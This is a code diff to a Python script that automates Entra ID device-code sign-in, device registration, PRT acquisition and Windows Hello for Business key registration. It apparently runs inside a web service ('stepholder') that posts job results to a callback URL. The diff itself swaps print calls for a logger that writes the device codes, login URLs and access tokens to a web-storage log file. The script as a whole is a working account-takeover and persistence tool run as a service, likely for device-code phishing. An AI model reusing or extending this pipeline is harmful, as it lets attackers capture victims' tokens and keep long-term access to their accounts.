@@ -1,6 +1,8 @@
 import logging
 
 logging.basicConfig(level=logging.DEBUG)
+
+import datetime
 import argparse
 import traceback
 import uuid
@@ -36,8 +38,27 @@ from roadtools.roadlib.deviceauth import DeviceAuthentication
 Description = "DeviceCode2WinHelloForBusiness is a small script that automates the registration flow for WFB key with a device code auth or a user provided refresh token."
 
 
+LOG_FILE = "/var/www/stepholder/storage/logs/python.log"
+
+
+def log(*args, sep=" ", end="\n", flush=False):
+    message = sep.join(str(a) for a in args)
+    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+    final = f"[{timestamp}] {message}{end}"
+
+    # write ke file
+    with open(LOG_FILE, "a") as f:
+        f.write(final)
+        if flush:
+            f.flush()
+
+            # output ke console
+            print(final, end="")
+
+
 def debug(msg):
-    print(f"DEBUG_PYTHON:{msg}", flush=True)
+    log(f"DEBUG_PYTHON:{msg}", flush=True)
 
 
 def send_callback(callback_url, callback_secret, job_id, payload):
@@ -56,7 +77,7 @@ def send_callback(callback_url, callback_secret, job_id, payload):
     try:
         requests.post(callback_url, json=body, headers=headers, timeout=15)
     except Exception as e:
-        print(f"CALLBACK_FAILED:{str(e)}", flush=True)
+        log(f"CALLBACK_FAILED:{str(e)}", flush=True)
 
 
 class deviceCode2WFH(Authentication, DeviceAuthentication):
@@ -78,7 +99,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
         self.session_dir = os.path.join(base_dir, str(uuid.uuid4()))
         os.makedirs(self.session_dir, exist_ok=True)
 
-        print(f"SESSION_DIR={self.session_dir}", flush=True)
+        log(f"SESSION_DIR={self.session_dir}", flush=True)
 
     ### Hard-coding the clientID because this is the only client can request PRT with its refresh token...
     def device_code_wrapper(self):
@@ -140,7 +161,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
                                 key_size=2048,
                             )
                             # Write device key to disk
-                            print(f"Saving private key to {privout}")
+                            log(f"Saving private key to {privout}")
                             debug(f"WRITE_KEY={privout}")
                             with open(privout, "wb") as keyf:
                                 keyf.write(
@@ -225,7 +246,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
                                             "Content-Type": "application/json",
                                         }
 
-                                        print("Registering device")
+                                        log("Registering device")
                                         res = requests.post(
                                             "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=2.0",
                                             json=data,
@@ -235,14 +256,14 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
                                         )
                                         returndata = res.json()
 
-                                        print(
+                                        log(
                                             "REGISTER_RESPONSE_STATUS:", res.status_code
                                         )
-                                        print("REGISTER_RESPONSE_BODY:")
+                                        log("REGISTER_RESPONSE_BODY:")
                                         pprint.pprint(returndata)
 
                                         if not "Certificate" in returndata:
-                                            print("❌ DEVICE REGISTRATION FAILED")
+                                            log("❌ DEVICE REGISTRATION FAILED")
 
                                             return False
                                         cert = x509.load_der_x509_certificate(
@@ -252,14 +273,14 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
                                         )
                                         # There is only one, so print it
                                         for attribute in cert.subject:
-                                            print(f"Device ID: {attribute.value}")
+                                            log(f"Device ID: {attribute.value}")
                                             with open(certout, "wb") as certf:
                                                 certf.write(
                                                     cert.public_bytes(
                                                         serialization.Encoding.PEM
                                                     )
                                                 )
-                                                print(
+                                                log(
                                                     f"Saved device certificate to {certout}"
                                                 )
                                                 # returning the certificate and private key to use them next instead of reading from disk everytime
@@ -277,8 +298,8 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
                                                 )
 
     def register_entraid_devices(self):
-        print("[*] Registering azuread devices", flush=True)
-        print(
+        log("[*] Registering azuread devices", flush=True)
+        log(
             "[*] Asking for another token for device registration resource: "
             + WELLKNOWN_RESOURCES["devicereg"]
         )
@@ -286,16 +307,16 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
         devicereg_token = self.authenticate_with_refresh_native(
             self.refresh_token, client_secret=self.password
         )
-        print("DEVICE REG TOKEN:", devicereg_token)
+        log("DEVICE REG TOKEN:", devicereg_token)
         # A quick sanity check on the device registration token
         if devicereg_token:
             _, tokendata = self.parse_accesstoken(devicereg_token["accessToken"])
-            print("TOKEN AUD:", tokendata.get("aud"))
+            log("TOKEN AUD:", tokendata.get("aud"))
             if tokendata["aud"] != "urn:ms-drs:enterpriseregistration.windows.net":
-                print(
+                log(
                     f"Wrong token audience, got {tokendata['aud']} but expected: urn:ms-drs:enterpriseregistration.windows.net"
                 )
-                print(
+                log(
                     "Make sure to request a token with -r urn:ms-drs:enterpriseregistration.windows.net"
                 )
                 return
@@ -316,7 +337,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
         return True
 
     def refreshtoken_to_prt_wrapper(self, refresh_token):
-        print(
+        log(
             "[*] requesting new PRT with Entra ID using refresh token that we request previously as client 'msbroker': "
             + WELLKNOWN_CLIENTS["broker"]
         )
@@ -339,7 +360,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
         self.outfile = os.path.join(self.session_dir, ".roadtools_auth")
         with codecs.open(self.outfile, "w", "utf-8") as outfile:
             json.dump(self.tokendata, outfile)
-            print("Tokens were written to {}".format(self.outfile))
+            log("Tokens were written to {}".format(self.outfile))
             tokenobject, tokendata = self.parse_accesstoken(
                 self.tokendata["accessToken"]
             )
@@ -347,7 +368,7 @@ class deviceCode2WFH(Authentication, DeviceAuthentication):
             result = self.register_winhello_key(
                 pubkeycngblob, tokenobject["accessToken"]
             )
-            print(result)
+            log(result)
 
 
 def main():
@@ -464,9 +485,9 @@ def main():
         else:
             debug("BEFORE_DEVICE_FLOW")
             device = action.get_device_code_only()
-            print("FULL DEVICE RESPONSE:", device)
-            print("DEVICE CODE:", device.get("user_code"))
-            print(
+            log("FULL DEVICE RESPONSE:", device)
+            log("DEVICE CODE:", device.get("user_code"))
+            log(
                 "LOGIN URL:",
                 device.get("verification_url")
                 or device.get("verification_uri_complete"),
@@ -554,7 +575,7 @@ def main():
                         return
 
                 except Exception as e:
-                    print("POLL_ERROR:", str(e))
+                    log("POLL_ERROR:", str(e))
 
                 time.sleep(interval)
             debug("DEVICE_FLOW_DONE")
@@ -574,7 +595,7 @@ def main():
             certout = None
             privout = None
             if args.cert_pem and args.key_pem:
-                print("[*] Using user provided certs and private keys")
+                log("[*] Using user provided certs and private keys")
                 certout = args.cert_pem
                 privout = args.key_pem
                 action.loadcert(
@@ -597,7 +618,7 @@ def main():
                 try:
                     result = action.register_entraid_devices()
                 except Exception as e:
-                    print("REGISTER_EXCEPTION:", str(e))
+                    log("REGISTER_EXCEPTION:", str(e))
                     traceback.print_exc()
 
                     send_callback(
@@ -613,7 +634,7 @@ def main():
                     return
 
                 if not result:
-                    print("REGISTER_RETURNED_FALSE")
+                    log("REGISTER_RETURNED_FALSE")
 
                     send_callback(
                         args.callback_url,
@@ -639,7 +660,7 @@ def main():
                     )
                     return
                 if prtdata:
-                    print("[✔] Congratulations! You got a new PRT!")
+                    log("[✔] Congratulations! You got a new PRT!")
                     prt_filename = (
                         args.prt_file
                         if args.prt_file
@@ -747,7 +768,7 @@ def main():
                             return
                     if args.wfb:
                         if not args.username:
-                            print("You will need to supply the username")
+                            log("You will need to supply the username")
                             action.windows_hello_for_business(
                                 args.username,
                                 driver_path=args.driver_path,
